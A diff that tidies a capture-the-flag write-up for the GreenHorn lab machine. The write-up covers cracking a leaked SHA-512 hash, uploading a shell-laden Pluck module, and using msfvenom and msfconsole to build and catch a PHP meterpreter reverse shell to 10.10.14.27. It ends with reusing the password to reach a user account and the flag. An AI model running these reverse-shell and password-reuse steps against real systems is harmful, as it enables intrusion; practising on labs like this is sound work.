@@ -1,62 +1,70 @@
-At port 80 we have a pluck application 
-On first analysis i cant find a exploit for that.
+## Exploit Summary
 
-At port 3000 we have an git repository server powered by gitea
-i found a repository of the application on port 80
+### Port 80
+- **Service:** Pluck application
+- **Initial Analysis:** No immediate exploit found
 
-The repository has a file called pass.php
-this file has the hash:
+### Port 3000
+- **Service:** Git repository server powered by Gitea
+- **Findings:** Repository of the application on port 80
 
-d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163
+### Repository Analysis
+- **File:** `pass.php`
+- **Hash Found:** `d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163`
+- **Hash Type:** SHA-512
+- **Plaintext String:** `iloveyou1`
+- **Possible Use:** Master admin password
 
-this hash is a sha 512 of the strig:
+### Exploitation Steps
 
-iloveyou1
+1. **Login to Pluck Platform:**
+   - Used `iloveyou1` to login as admin.
 
-this string can be the master admin password
+2. **Module Upload:**
+   - Downloaded a test module.
+   - Injected a shell into the module.
+   - Uploaded the module to gain access as `www-data` user.
 
-i logged on admin pluck plaform.
-We can upload a module for pluck.
-I dowloaded a test module and inject a shell on this module.
-With this shell i logged on machine as www-data user.
+3. **Privilege Escalation:**
+   - **User Flag:**
+     - Found `user.txt` in `/home/junior`, but lacked read permission.
 
-i founded the user.txt file on folder /home/junior  but i havent permission to read
+4. **Backdoor Creation:**
+   - **Msfvenom:**
+     ```shell
+     msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.27 LPORT=9001 -f raw -o shell.php
+     ```
+   - **Msfconsole:**
+     ```shell
+     set LHOST 10.10.14.27
+     set LPORT 9001
+     set PAYLOAD php/meterpreter/reverse_tcp
+     exploit
+     ```
+   - **Execution:**
+     - Accessed: `http://greenhorn.htb/data/modules/simple/shell.php`
+     - Successfully executed the backdoor exploit.
 
-i used msfvenon to create a backdoor, i uploaded a new shell and used msfconsole to exploit.
+### Post Exploitation
 
-terminal:
-msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.27 LPORT=9001 -f raw -o shell.php LPORT=9001 -f raw -o shell.php
+- **Recon:**
+  - **Metasploit Local Exploit Suggester:**
+    - Command: `multi/recon/local_exploit_suggester`
+    - Result: No useful exploits found.
+  - **LinPEAS Script:**
+    - Ran the script, but no valuable information was found.
 
+- **User Privilege Escalation:**
+  - Used Pluck admin password (`iloveyou1`) to switch to `junior` user:
+    ```shell
+    su - junior
+    ```
+  - Successfully switched to `junior` user.
 
-msfconsole:
-set LHOST 10.10.14.27
-set LPORT 9001
-set PAYLOAD php/meterpreter/reverse_tcp
-exploit
-
-i ran the url :
-http://greenhorn.htb/data/modules/simple/shell.php
-
-and the backdoor exploit was executed with success
-
-tried the recon
-multi/recon/local_exploit_suggester .... nothing founded
-
-
-I ran the linpeas script...nothing
-
-i tried to use the pluck admin password with junior user:
-
-command `su - junior`
-
-used the password iloveyou1
-
-booooom
-
-
-cd /home/junior
-cat user.txt
-6a726a101baa431fced0240a747825af
-
-
-
+- **Retrieve User Flag:**
+  - Command:
+    ```shell
+    cd /home/junior
+    cat user.txt
+    ```
+  - User flag: `6a726a101baa431fced0240a747825af`
